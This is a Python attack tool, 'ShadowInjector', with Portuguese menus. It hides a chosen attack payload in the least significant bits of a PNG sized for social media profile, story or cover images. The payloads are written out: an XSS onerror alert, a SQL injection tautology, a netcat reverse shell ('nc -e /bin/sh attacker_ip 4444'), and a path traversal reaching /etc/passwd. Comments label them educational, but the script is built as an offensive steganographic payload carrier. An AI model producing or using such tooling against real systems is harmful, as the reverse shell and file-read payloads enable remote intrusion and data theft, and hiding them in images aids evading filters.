#!/usr/bin/env python3
from PIL import Image, ImageOps
import hashlib
import sys

class ShadowInjector:
    def __init__(self):
        self.banner = r"""
        ███████╗██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗    ██╗
        ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║    ██║
        ███████╗███████║███████║██║  ██║██║   ██║██║ █╗ ██║
        ╚════██║██╔══██║██╔══██║██║  ██║██║   ██║██║███╗██║
        ███████║██║  ██║██║  ██║██████╔╝╚██████╔╝╚███╔███╔╝
        ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝ 
                  ______
               .-"      "-.
              /            \
             |              |
             |,  .-.  .-.  ,|
             | )(__/  \__)( |
             |/     /\     \|
             (_     ^^     _)
              \__|IIIIII|__/
               | \IIIIII/ |
               \          /
                `--------`
        """
        self.sizes = {
            '1': ('Perfil', (1080, 1080)),
            '2': ('Story', (1080, 1920)),
            '3': ('Capa', (820, 312)),
            '4': ('Customizado', None)
        }
        self.vulns = {
            '1': ('XSS', self._gen_xss),
            '2': ('SQLi', self._gen_sqli),
            '3': ('RCE', self._gen_rce),
            '4': ('LFI', self._gen_lfi)
        }

    def show_menu(self):
        print(self.banner)
        print("\n[+] Selecione o tipo de vulnerabilidade:")
        for k in sorted(self.vulns.keys()):
            print(f" {k}. {self.vulns[k][0]}")
        vuln = self._get_choice(self.vulns)

        print("\n[+] Selecione o formato da imagem:")
        for k in sorted(self.sizes.keys()):
            label, size = self.sizes[k]
            size_str = f"{size[0]}x{size[1]}" if size else "Customizado"
            print(f" {k}. {label} ({size_str})")
        size_choice = self._get_choice(self.sizes)
        if size_choice[0] == 'Customizado':
            size_choice = ('Customizado', self._custom_size())

        return vuln[1](), size_choice[1]

    def _get_choice(self, options):
        while True:
            choice = input("\n> Opção: ").strip()
            if choice in options:
                return options[choice]
            print("[!] Opção inválida! Tente novamente.")

    def _custom_size(self):
        try:
            w = int(input("Largura: "))
            h = int(input("Altura: "))
            return (w, h)
        except ValueError:
            print("[!] Dimensões inválidas! Usando padrão 1080x1080")
            return (1080, 1080)

    def _gen_xss(self):
        # Exemplo de payload XSS real (para fins educacionais)
        return '<img src=x onerror=alert("XSS Real")>'

    def _gen_sqli(self):
        # Exemplo de payload SQL Injection real (para fins educacionais)
        return "' OR '1'='1' -- "

    def _gen_rce(self):
        # Exemplo de payload Remote Code Execution real (para fins educacionais)
        return "; nc -e /bin/sh attacker_ip 4444;"

    def _gen_lfi(self):
        # Exemplo de payload Local File Inclusion real (para fins educacionais)
        return "../../../../etc/passwd"

    def generate(self, payload, size, output_file='shadow_image.png'):
        # Cria uma imagem nova com fundo preto
        img = Image.new('RGB', size, '#000')
        img = ImageOps.fit(img, size, method=Image.NEAREST)

        # Converte o payload para uma string binária
        binary = ''.join(format(ord(c), '08b') for c in payload)
        total_bits = len(binary)
        width, height = img.size
        capacity = width * height  # cada pixel armazena 1 bit no canal R

        if total_bits > capacity:
            print(f"[!] O payload é muito grande para a imagem escolhida.")
            print(f"    Capacidade: {capacity} bits, Payload: {total_bits} bits.")
            sys.exit(1)

        pixels = img.load()
        idx = 0
        for i in range(width):
            for j in range(height):
                if idx >= total_bits:
                    img.save(output_file)
                    return
                r, g, b = pixels[i, j]
                # Injeta o bit do payload no LSB do canal R
                r = (r & 0xFE) | int(binary[idx])
                idx += 1
                pixels[i, j] = (r, g, b)

        img.save(output_file)

def main():
    try:
        shadow = ShadowInjector()
        payload, size = shadow.show_menu()
        output_file = "shadow_image.png"
        shadow.generate(payload, size, output_file)

        with open(output_file, 'rb') as f:
            sha256_hash = hashlib.sha256(f.read()).hexdigest()

        print("\n[+] Imagem gerada com sucesso!")
        print(f"Arquivo: {output_file}")
        print(f"Tamanho: {size[0]}x{size[1]}")
        print(f"SHA256: {sha256_hash}")

    except KeyboardInterrupt:
        print("\n[!] Operação cancelada pelo usuário")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Ocorreu um erro: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
